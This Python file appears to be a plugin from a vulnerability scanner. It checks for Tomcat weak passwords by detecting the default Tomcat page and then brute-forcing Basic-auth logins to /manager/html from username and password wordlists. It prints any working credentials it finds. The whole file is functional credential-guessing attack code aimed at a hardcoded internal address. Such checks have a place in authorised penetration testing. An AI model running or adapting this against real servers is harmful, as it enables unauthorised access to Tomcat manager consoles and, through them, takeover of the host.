#!/usr/bin/env python3

'''
name: Tomcat 弱口令漏洞
description: Tomcat 弱口令漏洞
'''

import json
import base64
from app.lib.utils.request import request

class Tomcat_Weakpwd_BaseVerify:
    def __init__(self, url):
        self.url = url
        self.timeout = 10
        self.headers = {
            "User-Agent": "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:56.0) Gecko/20100101 Firefox/56.0"
        }

    def run(self):
        if not self.url.startswith("http") and not self.url.startswith("https"):
            self.url = "http://" + self.url
        try:
            check_req = request.get(self.url, headers = self.headers)
            if "installed Tomcat. Congratulations!" in check_req.text:
                for user in open('app/username.txt', 'r', encoding = 'utf-8').readlines():
                    user = user.strip()
                    for pwd in open('app/password.txt', 'r', encoding = 'utf-8').readlines():
                        if pwd != '':
                            pwd = pwd.strip()
                        author = ("%s:%s") % (user, pwd)
                        self.headers["Authorization"] = "Basic " + base64.b64encode(author.encode('utf-8')).decode('utf-8')
                        result_req = request.get(self.url + '/manager/html', headers = self.headers)
                        if "Tomcat Web Application Manager" in result_req.text:
                            print('存在Tomcat 弱口令漏洞,账号密码为:', user, pwd)
                            return True
                print('不存在Tomcat 弱口令漏洞')
                return False
            else:
                print('不存在Tomcat 弱口令漏洞')
                return False
        except Exception as e:
            print(e)
            print('不存在Tomcat 弱口令漏洞')
            return False
        finally:
            pass

if __name__ == '__main__':
    Tomcat_Weakpwd = Tomcat_Weakpwd_BaseVerify('http://192.168.30.242:8080')
    Tomcat_Weakpwd.run()
